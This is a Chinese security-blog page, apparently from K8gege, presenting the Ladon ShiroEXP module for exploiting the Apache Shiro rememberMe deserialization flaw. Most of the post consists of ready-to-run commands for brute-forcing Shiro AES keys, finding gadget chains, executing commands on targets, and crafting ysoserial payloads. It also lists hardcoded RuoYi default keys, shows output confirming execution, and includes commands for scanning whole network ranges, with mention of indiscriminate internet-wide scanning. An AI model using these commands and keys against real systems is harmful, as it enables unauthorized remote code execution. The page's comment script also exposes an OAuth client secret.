@@ -1,0 +1,432 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="EXP,Shiro">
+
+
+<meta name="description" content=" 
+
+
+Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现
+功能简介
+
+支持执行自定义payload (ysoserial)
+一键爆破Shiro Key 自动CBC/GCM...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Ladon ShiroEXP高效爆破Key 反序列化漏洞复现 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Ladon ShiroEXP高效爆破Key 反序列化漏洞复现">
+            
+            Ladon ShiroEXP高效爆破Key 反序列化漏洞复现
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/EXP/">EXP</a> <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/EXP/" rel="tag">EXP</a> <a class="tag-none-link" href="/tags/Shiro/" rel="tag">Shiro</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2024/12/10</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p style="color:#fff;"> 
+&lt;% 
+<span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+</span>
+%&gt;
+</p>
+<p>Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现</p>
+<h3 id="功能简介">功能简介</h3>
+<p>
+支持执行自定义payload (ysoserial)
+一键爆破Shiro Key 自动CBC/GCM 支持keys.txt
+多线程检测1100+仅需几十秒
+一键检测 反序列化 利用链
+Shiro高版本GCM回显命令执行(不出网)
+Shiro低版本CBC回显命令执行(不出网)
+输出ShiroExp.log
+</p><p>命令执行-回显利用链<br>
+CommonsCollectionsK2<br>
+CommonsBeanutils2<br>
+Jdk7u21<br>
+Jdk8u20<br>
+CommonsBeanutils1<br>
+CommonsCollectionsK1</p>
+<p></p>
+<h3 id="Shiro反序列化漏洞原理">Shiro反序列化漏洞原理</h3>
+<p>由于Apache Shiro cookie中通过 AES-128-CBC、AES-128-GCM 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<h3 id="爆破Shiro-Key">爆破Shiro Key</h3>
+<p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>
+支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key2.png"></p>
+<h3 id="爆破利用链">爆破利用链</h3>
+<p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/gadget.png"></p>
+<h3 id="ShiroEXP-漏洞利用">ShiroEXP 漏洞利用</h3>
+<p>使用爆破出来的对应利用链，无回显执行命令</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/exp.png"></p>
+<h3 id="Rouyi-4-x漏洞利用">Rouyi 4.x漏洞利用</h3>
+<p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
+<h3 id="执行自定义payload">执行自定义payload</h3>
+<h4 id="ysoserial生成payload">ysoserial生成payload</h4>
+<p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"touch /tmp/k8gege.txt"</span> &gt; yso.ser</span><br></pre></td></tr></tbody></table></figure>
+<p>使用对应KEY 对应加密方式 执行payload 如shiro低版本 AES-CBC对应KEY加密，再发送加密后的cookie，所以这是为什么直接抓别人包，发送YSO生成payload无效的原因，一定要了解整个EXP通信原理，而不是表面理解，只知道通过remberME字段反序列化，可是让自己构造个payload，都不知道要封装成对应的，随意找个class当然不行啊，除非是原生JAVA，且支持所有java版本的class，明显没有，存在通用反序化payload的话就不需要ysoserial工具了。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc diy yso.ser</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="检测是否执行成功">检测是否执行成功</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc CommonsCollectionsK1 <span class="string">"ls /tmp"</span></span><br><span class="line"></span><br><span class="line">http://192.168.50.223:8080 IsShiro</span><br><span class="line">Exp...</span><br><span class="line">Res:</span><br><span class="line">hsperfdata_root</span><br><span class="line">k8gege.txt ---</span><br><span class="line">tomcat-docbase.6132634819123728545.8080</span><br><span class="line">tomcat.2080411627486188816.8080</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="影响版本">影响版本</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt; 1.2.4</span><br><span class="line"></span><br><span class="line">RuoYi 版本号 对象版本的默认AES密钥</span><br><span class="line">4.6.1-4.3.1 zSyK5Kp6PZAAjlT+eeNMlg==</span><br><span class="line">3.4-及以下 fCq+/xW488hMTCD+cmJ3aQ==</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Shiro框架检测">Shiro框架检测</h3>
+<p>模块IsShiro，Cobalt Strike下命令用法一致,但无需上传EXE至目标，内存加载，隐蔽性高</p>
+<h3 id="指定URL">指定URL</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="指定IP">指定IP</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="批量URL">批量URL</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<p>PS：TXT可存放IP、IP:Port、URL等格式</p>
+<h3 id="批量IP">批量IP</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt IsShiro</span><br><span class="line">Ladon noping ip.txt IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="指定C段">指定C段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="指定B段">指定B段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="指定A段">指定A段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="批量C段">批量C段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt IsShiro</span><br><span class="line">Ladon ipc.txt IsShiro</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt IsShiro</span><br><span class="line">Ladon noping ipc.txt IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: TXT存放多个目标的C段IP</p>
+<h3 id="批量B段">批量B段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt IsShiro</span><br><span class="line">Ladon noping ip16.txt IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: TXT存放多个目标的B段IP</p>
+<h3 id="批量网段">批量网段</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt IsShiro</span><br><span class="line">Ladon noping cidr.txt IsShiro</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: TXT存放各种IP网段，全网无差别扫描</p>
+<h3 id="更多功能-使用教程">更多功能 使用教程</h3>
+<p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/freeai.html" class="pre-post btn btn-default" title="Ladon白嫖AI大模型 DeepSeek R1 和 Qwen 2.5">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            Ladon白嫖AI大模型 DeepSeek R1 和 Qwen 2.5</span>
+    </a>
+    
+    
+    <a href="/p/CVE-2024-47575.html" class="next-post btn btn-default" title="FortiManager CVE-2024-47575 RCE漏洞复现">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            FortiManager CVE-2024-47575 RCE漏洞复现</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E7%AE%80%E4%BB%8B"><span class="toc-text">功能简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">Shiro反序列化漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4Shiro-Key"><span class="toc-text">爆破Shiro Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">爆破利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShiroEXP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">ShiroEXP 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rouyi-4-x%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Rouyi 4.x漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89payload"><span class="toc-text">执行自定义payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ysoserial%E7%94%9F%E6%88%90payload"><span class="toc-text">ysoserial生成payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F"><span class="toc-text">检测是否执行成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E6%A1%86%E6%9E%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">Shiro框架检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9AURL"><span class="toc-text">指定URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9AIP"><span class="toc-text">指定IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FURL"><span class="toc-text">批量URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FIP"><span class="toc-text">批量IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9AC%E6%AE%B5"><span class="toc-text">指定C段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9AB%E6%AE%B5"><span class="toc-text">指定B段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9AA%E6%AE%B5"><span class="toc-text">指定A段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FC%E6%AE%B5"><span class="toc-text">批量C段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FB%E6%AE%B5"><span class="toc-text">批量B段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E7%BD%91%E6%AE%B5"><span class="toc-text">批量网段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-text">更多功能 使用教程</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
